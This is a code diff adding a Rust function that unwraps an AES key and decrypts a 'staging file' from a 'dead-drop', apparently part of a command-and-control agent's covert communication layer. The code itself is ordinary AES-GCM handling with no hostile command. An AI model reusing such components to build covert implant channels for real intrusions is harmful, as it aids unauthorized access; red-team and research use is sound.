@@ -176,3 +176,23 @@ pub fn encrypt_response(resp: &crate::protocol::TaskResponse, pub_key: &PubKey) 
     let result = format!("{}:{}", B64.encode(&wrapped?), B64.encode(&blob?));
     Some(result)
 }
+
+/// Decrypt a staging file downloaded from the dead-drop (server → agent direction).
+///
+/// Binary format:
+///   [4 LE: len(wrapped_aes)] [wrapped_aes] [GCM blob = nonce(12)||ct||tag(16)]
+///
+/// session_key unwraps the AES key; AES key decrypts the file content.
+pub fn decrypt_staging(data: &[u8], session_key: &[u8; 32]) -> Option<Vec<u8>> {
+    if data.len() < 4 { return None; }
+    let wlen = u32::from_le_bytes([data[0], data[1], data[2], data[3]]) as usize;
+    if data.len() < 4 + wlen + 28 { return None; }  // 28 = min GCM blob (12+16)
+    let wrapped = &data[4..4 + wlen];
+    let blob    = &data[4 + wlen..];
+
+    let aes_key_vec = gcm_open(session_key, wrapped)?;
+    let mut aes_key = slice_to_key32(&aes_key_vec)?;
+    let plaintext   = gcm_open(&aes_key, blob);
+    aes_key.zeroize();
+    plaintext
+}
